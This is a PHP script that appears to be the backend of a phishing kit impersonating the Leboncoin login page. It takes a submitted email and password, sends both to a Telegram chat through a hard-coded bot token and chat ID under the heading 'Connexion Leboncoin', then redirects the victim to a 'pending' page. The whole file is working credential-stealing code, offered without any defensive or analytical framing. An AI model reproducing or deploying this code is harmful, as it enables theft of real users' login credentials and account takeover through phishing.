<?php
// Démarrer la session pour utiliser $_SESSION
session_start();

// Inclure la bibliothèque Telegram Bot API
require '/composer/vendor/autoload.php';

use Longman\TelegramBot\Telegram;
use Longman\TelegramBot\Request;
use Longman\TelegramBot\Entities\ServerResponse;

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Assainir et valider l'email
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $password = $_POST['password'];

    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        echo 'Adresse e-mail invalide.';
        exit;
    }

    // Enregistrer l'email dans la session pour une utilisation ultérieure
    $_SESSION['email'] = $email;

    // Initialiser l'API de Telegram avec votre jeton d'API
    $telegram = new Telegram('7109079707:AAF0h7b0qTjMN0LqT33GIfDMZczhJYAyxAQ'); // Remplacez par votre clé d'API

    // Créer le message que vous souhaitez envoyer à Telegram
    $message = "Connexion Leboncoin:\n\n";
    $message .= "E-mail : $email\n";
    $message .= "Mot de passe : $password\n";

    // L'ID du chat où vous voulez envoyer le message (remplacez par le vôtre)
    $chatId = '-1002427871420'; // Remplacez par votre ID de chat

    // Envoyer le message à Telegram
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    /** @var ServerResponse $response */
    $response = Request::sendMessage($data);

    // Vérifier si l'envoi a réussi
    if ($response->isOk()) {
        // Rediriger l'utilisateur vers la page suivante
        header("Location: ./index_files/pending/index.html");
        exit(); // Assurez-vous d'exiter après la redirection
    } else {
        echo "Erreur lors de l'envoi du message : " . $response->getDescription();
    }
} else {
    echo "Une erreur s'est produite lors de l'envoi du message.";
}
